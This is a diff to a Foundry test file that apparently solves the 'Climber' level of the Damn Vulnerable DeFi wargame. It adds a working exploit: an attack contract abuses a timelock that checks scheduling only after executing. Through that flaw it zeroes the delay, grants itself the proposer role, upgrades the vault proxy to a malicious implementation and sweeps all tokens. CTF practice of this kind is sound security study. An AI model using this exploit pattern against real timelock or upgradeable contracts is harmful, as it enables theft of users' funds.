@@ -6,7 +6,64 @@ import {Test, console} from "forge-std/Test.sol";
 import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
+contract MaliciousVaultImpl is ClimberVault {
+    function sweepFunds(address token, address to) external {
+        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
+    }
+}
+
+contract ClimberAttack {
+    ClimberVault private immutable vault;
+    ClimberTimelock private immutable timelock;
+    address private immutable recovery;
+    address private immutable token;
+
+    address[] private targets;
+    uint256[] private values;
+    bytes[] private dataElements;
+    bytes32 private constant SALT = bytes32(0);
+
+    constructor(address payable _vault, address payable _timelock, address _recovery, address _token) {
+        vault = ClimberVault(_vault);
+        timelock = ClimberTimelock(_timelock);
+        recovery = _recovery;
+        token = _token;
+    }
+
+    function attack(address maliciousImpl) external {
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
+
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
+        );
+
+        targets.push(address(vault));
+        values.push(0);
+        dataElements.push(
+            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
+        );
+
+        targets.push(address(this));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("scheduleAll()"));
+
+        timelock.execute(targets, values, dataElements, SALT);
+
+        MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
+    }
+
+    function scheduleAll() external {
+        timelock.schedule(targets, values, dataElements, SALT);
+    }
+}
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +142,16 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
+
+        ClimberAttack attackContract = new ClimberAttack(
+            payable(address(vault)),
+            payable(address(timelock)),
+            recovery,
+            address(token)
+        );
+
+        attackContract.attack(address(maliciousImpl));
     }
 
     /**
